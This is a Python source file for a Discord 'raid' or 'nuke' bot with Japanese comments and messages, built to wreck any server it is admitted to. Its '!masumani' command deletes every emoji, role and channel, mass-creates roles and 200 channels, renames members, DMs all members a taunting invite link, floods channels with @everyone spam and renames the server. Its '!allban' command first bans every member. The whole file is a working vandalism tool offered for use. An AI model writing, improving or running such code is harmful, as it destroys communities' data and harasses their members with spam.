import discord
from discord.ext import commands
import asyncio
import aiohttp
import random
import os
from dotenv import load_dotenv

load_dotenv()

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'{bot.user} logged in')
    print(f'Bot ID: {bot.user.id}')

async def execute_raid(ctx, do_ban=False):
    new_server_name = 'ますまに共栄圏植民地｜MSMN'
    icon_url = 'https://i.imgur.com/uMaj6CP.jpeg'
    channel_name = 'ますまに共栄圏最強'
    channel_count = 200
    spam_message = '# このサーバーはますまに共栄圏によって荒らされました\nRaid by masumani\ndiscord.gg/DCKWUNfEA5\n@everyone\nhttps://cdn.discordapp.com/attachments/1236663988914229308/1287064282256900246/copy_89BE23AC-0647-468A-A5B9-504B5A98BC8B.gif?ex=68cf68c5&is=68ce1745&hm=1250d2c6de152cc6caab5c1b51f27163fdaa0ebff883fbbe7983959cdda7d782&'
    spam_count = 10
    role_name = 'ますまに共栄圏に荒らされましたww'
    role_count = 150

    guild = ctx.guild
    old_server_name = guild.name
    user = ctx.author

    await user.send('処理を開始します')

    # 1. 絵文字削除（高速化）
    try:
        emoji_delete_tasks = [emoji.delete() for emoji in guild.emojis]
        emoji_delete_results = await asyncio.gather(*emoji_delete_tasks, return_exceptions=True)
        emoji_deleted = sum(1 for r in emoji_delete_results if not isinstance(r, Exception))
        await user.send(f'絵文字削除: {emoji_deleted}個')
    except Exception as e:
        await user.send(f'絵文字削除失敗')

    # アイコンダウンロード
    icon_bytes = None
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(icon_url) as resp:
                if resp.status == 200:
                    icon_bytes = await resp.read()
    except:
        pass

    # 2. ロール削除（高速化・修正版）
    try:
        roles_to_delete = [role for role in guild.roles if role.name != '@everyone' and not role.managed and role < guild.me.top_role]
        role_delete_tasks = [role.delete() for role in roles_to_delete]
        role_delete_results = await asyncio.gather(*role_delete_tasks, return_exceptions=True)
        role_deleted = sum(1 for r in role_delete_results if not isinstance(r, Exception))
        await user.send(f'ロール削除: {role_deleted}個')
    except Exception as e:
        await user.send(f'ロール削除失敗')

    # 3. ロール作成（最速）
    created_roles = []
    try:
        role_created = 0
        for i in range(0, role_count, 75):
            batch = min(75, role_count - i)
            role_tasks = []
            for j in range(batch):
                color = discord.Color.from_rgb(random.randint(50, 255), random.randint(50, 255), random.randint(50, 255))
                role_tasks.append(guild.create_role(name=role_name, color=color))
            role_results = await asyncio.gather(*role_tasks, return_exceptions=True)
            for r in role_results:
                if not isinstance(r, Exception):
                    created_roles.append(r)
                    role_created += 1
            await asyncio.sleep(0.2)
        await user.send(f'ロール作成: {role_created}個')
    except Exception as e:
        await user.send(f'ロール作成失敗')

    # 4. メンバーにニックネーム変更＋ロール付与（超高速化）
    try:
        members_to_update = [m for m in guild.members if not m.bot and m != user and m != guild.me]

        async def update_member(member):
            try:
                # ランダムに5個のロールを付与
                if len(created_roles) >= 5:
                    roles_to_add = random.sample(created_roles, 5)
                    await member.edit(nick='ますまに共栄圏に敗北', roles=list(member.roles) + roles_to_add)
                else:
                    await member.edit(nick='ますまに共栄圏に敗北')
                return 1
            except:
                return 0

        # 全員同時処理
        update_tasks = [update_member(m) for m in members_to_update]
        update_results = await asyncio.gather(*update_tasks, return_exceptions=True)
        updated_count = sum(r for r in update_results if not isinstance(r, Exception))
        await user.send(f'メンバー更新: {updated_count}人')
    except Exception as e:
        await user.send(f'メンバー更新失敗')

    # 5. DM送信
    try:
        async def send_dm(member):
            try:
                await member.send(f'{old_server_name}を破壊しました https://discord.gg/DCKWUNfEA5')
                return 1
            except:
                return 0

        dm_tasks = [send_dm(m) for m in guild.members if not m.bot]
        dm_results = await asyncio.gather(*dm_tasks, return_exceptions=True)
        dm_count = sum(r for r in dm_results if not isinstance(r, Exception))
        await user.send(f'DM送信完了: {dm_count}人')
    except Exception as e:
        await user.send(f'DM送信失敗')

    # 6. アイコン・サーバー名変更
    try:
        if icon_bytes:
            await guild.edit(name=new_server_name, icon=icon_bytes)
        else:
            await guild.edit(name=new_server_name)
        await user.send('サーバー設定変更完了')
    except Exception as e:
        await user.send('サーバー設定変更失敗')

    # 7. チャンネル削除（高速化）
    try:
        channels_to_delete = list(guild.channels)
        channel_delete_tasks = [channel.delete() for channel in channels_to_delete]
        channel_delete_results = await asyncio.gather(*channel_delete_tasks, return_exceptions=True)
        deleted_count = sum(1 for r in channel_delete_results if not isinstance(r, Exception))
        await user.send(f'チャンネル削除: {deleted_count}個')
    except Exception as e:
        await user.send(f'チャンネル削除失敗')

    # 8. チャンネル作成（最速）
    created_channels = []
    created_count = 0
    try:
        for i in range(0, channel_count, 100):
            batch = min(100, channel_count - i)
            channel_tasks = [guild.create_text_channel(name=channel_name) for j in range(batch)]
            channel_results = await asyncio.gather(*channel_tasks, return_exceptions=True)
            for r in channel_results:
                if not isinstance(r, Exception):
                    created_channels.append(r)
                    created_count += 1
            await asyncio.sleep(0.2)
        await user.send(f'チャンネル作成: {created_count}個')
    except Exception as e:
        await user.send(f'チャンネル作成失敗: {created_count}個作成済み')

    # 9. allban確認とメッセージ送信
    if do_ban:
        await user.send('allban実行をスキップしてメッセージ送信へ')

    # 10. メッセージ送信（全チャンネル同時）
    try:
        await user.send('メッセージ送信中...')

        async def spam_channel_full(channel):
            count = 0
            for i in range(spam_count):
                try:
                    await channel.send(spam_message)
                    count += 1
                except:
                    break
            return count

        # 全チャンネル同時送信
        spam_tasks = [spam_channel_full(ch) for ch in created_channels]
        spam_results = await asyncio.gather(*spam_tasks, return_exceptions=True)
        total_messages = sum(r for r in spam_results if not isinstance(r, Exception))

        await user.send(f'完了 メッセージ送信: {total_messages}件')
    except Exception as e:
        await user.send(f'メッセージ送信失敗')

    await user.send('全処理完了')

    # サーバーから退出
    try:
        await guild.leave()
        await user.send('サーバーから退出しました')
    except Exception as e:
        await user.send(f'退出失敗: {e}')

@bot.command()
async def masumani(ctx):
    await ctx.message.delete()
    await execute_raid(ctx, do_ban=False)

@bot.command()
async def allban(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    user = ctx.author

    await user.send('BAN処理開始')

    members = [m for m in guild.members if not m.bot and m != user and m != guild.me]
    total = len(members)

    await user.send(f'対象: {total}人')

    banned = 0
    failed = 0

    for member in members:
        try:
            await guild.ban(member, reason='ますまに共栄圏BAN')
            banned += 1
            if banned % 10 == 0:
                await user.send(f'進捗: {banned}/{total}')
        except:
            failed += 1

    await user.send(f'BAN完了 成功:{banned} 失敗:{failed}')

    # BAN完了後にmasumaniと同じ処理を実行
    await execute_raid(ctx, do_ban=True)

if __name__ == '__main__':
    TOKEN = os.getenv('TOKEN')
    if not TOKEN:
        print('TOKEN not found')
        exit(1)
    bot.run(TOKEN)